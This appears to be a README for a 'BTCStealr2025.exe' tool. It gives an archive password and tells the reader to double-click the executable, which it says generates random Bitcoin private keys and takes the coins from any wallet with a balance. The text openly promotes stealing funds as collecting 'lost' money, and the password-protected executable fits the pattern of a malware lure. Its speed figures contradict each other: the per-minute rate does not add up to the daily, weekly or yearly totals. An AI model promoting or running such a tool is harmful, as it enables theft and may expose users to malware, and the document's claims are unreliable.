[Pass : S0f4fr33!]

Generate random bitcoin wallets & private keys (seeds) and then check if they match any wallet that has a positive balance, and then take all the btc from it.

# REQUIREMENTS

1. Lots of time on your hands.. there's a lot and I mean A LOT of possible addresses and keys, you will be extremely lucky to find any that will match your list.

 # HOW TO RUN
 Just double click BTCStealr2025.exe  

 # SPEED / PERFORMANCE
Results from a somewhat decent computer:
- 1.56 million checks every 1 minute
- 7.2 billion checks in 1 day
- 54 billion checks in a week
- 216 billion checks in a month
- 2.8 trillion checks in a year

- But please keep in mind that this is still really not much compared to all possible combinations that should be checked.

- # WHY DO THIS?
There are a lot of wallets with high balances that are lost forever, which means nobody can access them and the money is basically there just to be picked up by anyone. This program can possibly find these lost wallets and their matching private keys and take the btc out of them.
